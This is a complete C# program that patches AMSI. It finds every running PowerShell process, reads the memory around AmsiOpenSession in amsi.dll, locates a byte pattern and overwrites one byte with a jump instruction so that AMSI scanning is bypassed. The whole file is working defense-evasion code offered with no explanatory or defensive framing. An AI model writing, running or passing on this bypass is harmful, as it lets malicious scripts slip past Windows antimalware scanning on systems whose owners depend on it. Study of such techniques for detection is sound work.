using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Program
{
    static readonly byte[] Patch = { 0xEB };

    static int SearchPattern(byte[] startAddress, byte[] pattern)
    {
        for (int i = 0; i < startAddress.Length - pattern.Length; i++)
        {
            bool found = true;
            for (int j = 0; j < pattern.Length; j++)
            {
                if (pattern[j] != 0x3F && startAddress[i + j] != pattern[j])
                {
                    found = false;
                    break;
                }
            }
            if (found)
            {
                return i;
            }
        }
        return -1;
    }

    static bool PatchAmsi(int processId)
    {
        byte[] pattern = { 0x48, 0x85, 0xD2, 0x74, 0x3F, 0x48, 0x85, 0xC9, 0x74, 0x3A, 0x48, 0x83, 0x79, 0x08, 0x00, 0x74, 0x33 };

        Process process = Process.GetProcessById(processId);
        IntPtr processHandle = OpenProcess(ProcessAccessFlags.All, false, (uint)processId);

        if (processHandle == IntPtr.Zero)
        {
            return false;
        }

        IntPtr moduleHandle = LoadLibrary("amsi.dll");
        if (moduleHandle == IntPtr.Zero)
        {
            return false;
        }

        IntPtr amsiAddr = GetProcAddress(moduleHandle, "AmsiOpenSession");
        if (amsiAddr == IntPtr.Zero)
        {
            return false;
        }

        byte[] buffer = new byte[1024];
        if (!ReadProcessMemory(processHandle, amsiAddr, buffer, buffer.Length, out _))
        {
            return false;
        }

        int matchAddress = SearchPattern(buffer, pattern);
        if (matchAddress == -1)
        {
            return false;
        }

        Console.WriteLine($"AMSI address: 0x{amsiAddr.ToInt64():X}");
        Console.WriteLine($"Offset: {matchAddress}");

        long updateAmsiAddress = amsiAddr.ToInt64() + matchAddress;

        if (!WriteProcessMemory(processHandle, (IntPtr)updateAmsiAddress, Patch, Patch.Length, out _))
        {
            return false;
        }

        return true;
    }

    static void PatchAllPowershells(string processName)
    {
        Process[] processes = Process.GetProcessesByName(processName);
        foreach (Process process in processes)
        {
            if (PatchAmsi(process.Id))
            {
                Console.WriteLine($"AMSI patched in process {process.Id}");
            }
            else
            {
                Console.WriteLine($"Failed to patch AMSI in process {process.Id}");
            }
        }
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

    [Flags]
    enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF
    }

    static void Main()
    {
        PatchAllPowershells("powershell");
        Console.WriteLine("AMSI patched in all powershells");
        Console.ReadLine();
    }
}